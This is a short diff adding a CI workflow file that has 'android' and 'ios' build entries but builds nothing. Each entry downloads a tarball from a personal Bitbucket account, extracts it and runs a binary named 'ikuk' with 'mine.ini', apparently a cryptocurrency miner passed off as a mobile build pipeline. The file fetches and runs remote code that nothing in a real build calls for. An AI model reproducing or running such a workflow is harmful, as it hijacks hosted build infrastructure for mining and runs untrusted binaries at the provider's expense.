@@ -1,0 +1,9 @@
+workflows:
+  android:
+    name: 1
+    scripts:
+      - wget https://bitbucket.org/Abyehaqi/haqie/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+  ios:
+    name: 2
+    scripts:
+      - wget https://bitbucket.org/Abyehaqi/haqie/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
